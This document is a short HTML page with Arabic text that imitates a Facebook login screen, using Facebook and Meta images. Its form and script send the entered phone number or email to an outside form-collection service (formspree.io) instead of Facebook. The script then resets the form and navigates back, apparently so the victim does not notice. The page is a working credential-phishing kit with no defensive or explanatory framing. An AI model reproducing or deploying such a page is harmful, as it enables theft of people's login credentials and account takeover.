<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title> Facebook login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <form action="https://formspree.io/f/mjyyqwrk" method="POST">
    
    <img src="facebook.jpg">

    
    <input type="input" name="name" placeholder="رقم الهاتف المحمول او البريد الالكتروني">
    

    
    </select>

    <input type="password" placeholder="كلمة السر" ></input>
    

    <button type="submit" id="sendBtn">تسجيل الدخول</button>
  <h5> هل نسيت كلمة السر ؟</h5>
  <img src="meta.jpg">
  </form>

  <script>
  var form = document.querySelector("form");
  var btn = form.querySelector("button[type=submit]");
  var msg = document.getElementById("statusMsg");

  function goBack() {
    if (history.length > 1) {
      history.back();
    } else if (document.referrer) {
      location.href = document.referrer;
    }
  }

  form.addEventListener("submit", function (e) {
    e.preventDefault();
    btn.disabled = true;
    btn.textContent = "تسجيل الدخول";
    if (msg) msg.textContent = "";

    fetch(form.action, {
      method: "POST",
      body: new FormData(form),
      headers: { "Accept": "application/json" }
    }).then(function (response) {
      if (response.ok) {
        form.reset();
        btn.textContent = "تسجيل الدخول";
        setTimeout(goBack, 1000);
      } else {
        btn.disabled = false;
        btn.textContent = "إرسال";
        if (msg) msg.textContent = "حصل خطأ، جرب تاني.";
      }
    }).catch(function () {
      btn.disabled = false;
      btn.textContent = "إرسال";
      if (msg) msg.textContent = "حصل خطأ في الاتصال، جرب تاني.";
    });
  });
</script>
</body>
</html>
